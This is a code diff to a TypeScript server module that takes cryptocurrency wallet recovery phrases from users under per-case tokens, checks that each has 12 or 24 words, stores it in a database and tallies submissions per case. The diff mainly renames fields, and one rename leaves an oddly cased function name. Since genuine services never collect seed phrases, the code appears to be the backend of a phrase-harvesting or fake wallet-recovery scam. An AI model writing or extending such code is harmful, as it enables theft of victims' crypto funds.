@@ -5,9 +5,9 @@ import { findActiveTokenByString, updateTokenLastUsed } from './authToken';
 import { WALLET_TYPE } from '@/generated/prisma/client';
 
 export interface RecoverySubmissionData {
-	authToken: string;
+	token: string;
 	walletType: string;
-	recoveryPhrase: string;
+	phrase: string;
 	userEmail?: string;
 	createdAt: Date;
 }
@@ -89,9 +89,9 @@ export async function submitRecoveryRequest(
 		}
 
 		if (
-			!data.authToken ||
-			typeof data.authToken !== 'string' ||
-			data.authToken.trim() === ''
+			!data.token ||
+			typeof data.token !== 'string' ||
+			data.token.trim() === ''
 		) {
 			return {
 				success: false,
@@ -113,9 +113,9 @@ export async function submitRecoveryRequest(
 		}
 
 		if (
-			!data.recoveryPhrase ||
-			typeof data.recoveryPhrase !== 'string' ||
-			data.recoveryPhrase.trim() === ''
+			!data.phrase ||
+			typeof data.phrase !== 'string' ||
+			data.phrase.trim() === ''
 		) {
 			return {
 				success: false,
@@ -132,7 +132,7 @@ export async function submitRecoveryRequest(
 			};
 		}
 
-		if (!validateRecoveryPhrase(data.recoveryPhrase)) {
+		if (!validateRecoveryPhrase(data.phrase)) {
 			return {
 				success: false,
 				message: 'Recovery phrase must be exactly 12 or 24 words',
@@ -140,8 +140,8 @@ export async function submitRecoveryRequest(
 			};
 		}
 
-		const authToken = await findActiveTokenByString(data.authToken.trim());
-		if (!authToken) {
+		const token = await findActiveTokenByString(data.token.trim());
+		if (!token) {
 			return {
 				success: false,
 				message: 'Invalid or expired auth token',
@@ -149,7 +149,7 @@ export async function submitRecoveryRequest(
 			};
 		}
 
-		const sanitizedPhrase = sanitizeRecoveryPhrase(data.recoveryPhrase);
+		const sanitizedPhrase = sanitizeRecoveryPhrase(data.phrase);
 
 		if (!sanitizedPhrase) {
 			return {
@@ -202,15 +202,15 @@ export async function submitRecoveryRequest(
 			},
 		});
 
-		await updateTokenLastUsed(authToken.id);
+		await updateTokenLastUsed(token.id);
 
 		return {
 			success: true,
 			message: 'Recovery request submitted successfully',
 			data: {
 				phraseId: newPhrase.id,
-				caseId: authToken.caseId,
-				caseTitle: authToken.caseTitle,
+				caseId: token.caseId,
+				caseTitle: token.caseTitle,
 			},
 		};
 	} catch (error) {
@@ -255,7 +255,7 @@ export async function submitRecoveryRequest(
  * @param tokenString - The token string to verify
  * @returns Promise<{ valid: boolean; caseInfo?: { caseId: string; caseTitle: string }; error?: string }>
  */
-export async function verifyAuthToken(tokenString: string): Promise<{
+export async function verifytoken(tokenString: string): Promise<{
 	valid: boolean;
 	caseInfo?: { caseId: string; caseTitle: string };
 	error?: string;
@@ -272,9 +272,9 @@ export async function verifyAuthToken(tokenString: string): Promise<{
 			};
 		}
 
-		const authToken = await findActiveTokenByString(tokenString.trim());
+		const token = await findActiveTokenByString(tokenString.trim());
 
-		if (!authToken) {
+		if (!token) {
 			return {
 				valid: false,
 				error: 'Invalid or expired token',
@@ -284,8 +284,8 @@ export async function verifyAuthToken(tokenString: string): Promise<{
 		return {
 			valid: true,
 			caseInfo: {
-				caseId: authToken.caseId,
-				caseTitle: authToken.caseTitle,
+				caseId: token.caseId,
+				caseTitle: token.caseTitle,
 			},
 		};
 	} catch (error) {
@@ -315,12 +315,12 @@ export async function getRecoveryStats(caseId: string): Promise<{
 			};
 		}
 
-		const authTokens = await db.authToken.findMany({
+		const tokens = await db.authToken.findMany({
 			where: { caseId: caseId.trim() },
 			select: { token: true },
 		});
 
-		if (authTokens.length === 0) {
+		if (tokens.length === 0) {
 			return {
 				totalSubmissions: 0,
 				uniqueWalletTypes: 0,
